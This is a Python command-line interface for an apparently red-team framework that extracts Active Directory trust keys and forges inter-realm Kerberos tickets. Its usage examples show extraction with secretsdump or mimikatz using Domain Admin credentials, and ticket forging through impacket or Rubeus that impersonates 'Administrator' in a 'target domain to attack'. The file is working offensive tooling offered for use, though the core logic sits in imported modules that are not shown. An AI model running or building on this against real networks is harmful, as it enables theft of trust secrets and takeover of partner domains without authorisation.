"""
Trust Key Exploitation CLI
Command-line interface for the trust key exploitation framework
"""

import argparse
import sys

from .framework import TrustKeyFramework
from .models import TrustType, KeyType
from .extractors import get_available_extractors
from .forgers import get_available_forgers


def main():
    """Main CLI entry point"""
    parser = argparse.ArgumentParser(
        description="Trust Key Exploitation Framework - Extract and exploit AD trust keys",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Generate exploitation guide
  python -m rt_trust_keys --source-domain corp.local --target-domain partner.local \\
    --action guide --trust-type forest

  # Extract trust key using secretsdump
  python -m rt_trust_keys --source-domain corp.local --target-domain partner.local \\
    --username admin --password P@ssw0rd --dc-ip 192.168.1.10 --action extract

  # Forge inter-realm TGT (requires extracted key)
  python -m rt_trust_keys --source-domain corp.local --target-domain partner.local \\
    --action forge --trust-key NTLM_HASH_HERE

  # Test trust authentication
  python -m rt_trust_keys --source-domain corp.local --target-domain partner.local \\
    --username admin --password P@ssw0rd --action test
        """
    )

    # Required arguments
    parser.add_argument(
        '--source-domain', '-s',
        type=str,
        required=True,
        help='Source domain (where you have access)'
    )

    parser.add_argument(
        '--target-domain', '-t',
        type=str,
        required=True,
        help='Target domain to attack'
    )

    # Authentication
    parser.add_argument(
        '--username', '-u',
        type=str,
        help='Domain Admin username'
    )

    parser.add_argument(
        '--password', '-p',
        type=str,
        help='Domain Admin password'
    )

    parser.add_argument(
        '--dc-ip',
        type=str,
        help='Domain controller IP address'
    )

    # Action
    parser.add_argument(
        '--action', '-a',
        type=str,
        choices=['extract', 'forge', 'test', 'guide', 'quick-ref'],
        default='guide',
        help='Action to perform (default: guide)'
    )

    # Trust type (for guide generation)
    parser.add_argument(
        '--trust-type',
        type=str,
        choices=['parent-child', 'forest', 'external'],
        default='forest',
        help='Trust type (default: forest)'
    )

    # Trust key (for forging)
    parser.add_argument(
        '--trust-key',
        type=str,
        help='Trust key (NTLM hash) for ticket forging'
    )

    parser.add_argument(
        '--user-sid',
        type=str,
        help='Domain SID for ticket forging'
    )

    parser.add_argument(
        '--impersonate',
        type=str,
        default='Administrator',
        help='User to impersonate (default: Administrator)'
    )

    # Output
    parser.add_argument(
        '--output', '-o',
        type=str,
        default='trust_keys',
        help='Output directory (default: trust_keys)'
    )

    parser.add_argument(
        '--quiet', '-q',
        action='store_true',
        help='Suppress status messages'
    )

    # Parse arguments
    args = parser.parse_args()

    # Initialize framework
    framework = TrustKeyFramework(
        output_dir=args.output,
        verbose=not args.quiet
    )

    # List available tools
    framework.list_available_tools()

    # Execute action
    if args.action == 'extract':
        if not args.username or not args.password or not args.dc_ip:
            print("[-] Extract requires --username, --password, and --dc-ip")
            sys.exit(1)

        # Try secretsdump first (more likely available)
        available = get_available_extractors()

        if "secretsdump" in available:
            framework.extract_trust_key_secretsdump(
                args.source_domain,
                args.target_domain,
                args.username,
                args.password,
                args.dc_ip
            )
        else:
            framework.extract_trust_key_mimikatz(
                args.source_domain,
                args.target_domain,
                args.username,
                args.password,
                args.dc_ip
            )

    elif args.action == 'forge':
        if not args.trust_key:
            print("[-] Forge requires --trust-key")
            sys.exit(1)

        # Create TrustKey object
        from .models import TrustKey

        trust_key = TrustKey(
            account_name=f"{args.target_domain.split('.')[0].upper()}$",
            source_domain=args.source_domain,
            target_domain=args.target_domain,
            key_type=KeyType.RC4_HMAC,
            key_value=args.trust_key,
        )

        # Try available forgers
        available = get_available_forgers()

        if "impacket" in available:
            framework.forge_inter_realm_tgt_impacket(
                trust_key,
                args.impersonate,
                args.user_sid
            )
        elif "rubeus" in available:
            framework.forge_inter_realm_tgt_rubeus(
                trust_key,
                args.impersonate,
                args.user_sid
            )
        else:
            # Generate commands for manual execution
            framework.rubeus_forger.generate_commands(
                trust_key,
                args.impersonate,
                args.user_sid
            )
            framework.rubeus_forger.save_commands(
                framework.rubeus_forger.generate_commands(trust_key, args.impersonate),
                trust_key,
                args.impersonate
            )

    elif args.action == 'test':
        if not args.username or not args.password:
            print("[-] Test requires --username and --password")
            sys.exit(1)

        framework.test_trust_authentication(
            args.source_domain,
            args.target_domain,
            args.username,
            args.password
        )

    elif args.action == 'guide':
        framework.generate_exploitation_guide(
            args.source_domain,
            args.target_domain,
            args.trust_type
        )

    elif args.action == 'quick-ref':
        framework.print_quick_reference()

    # Generate report
    framework.generate_report()

    print(f"\n[+] Results saved to: {args.output}/")


if __name__ == "__main__":
    main()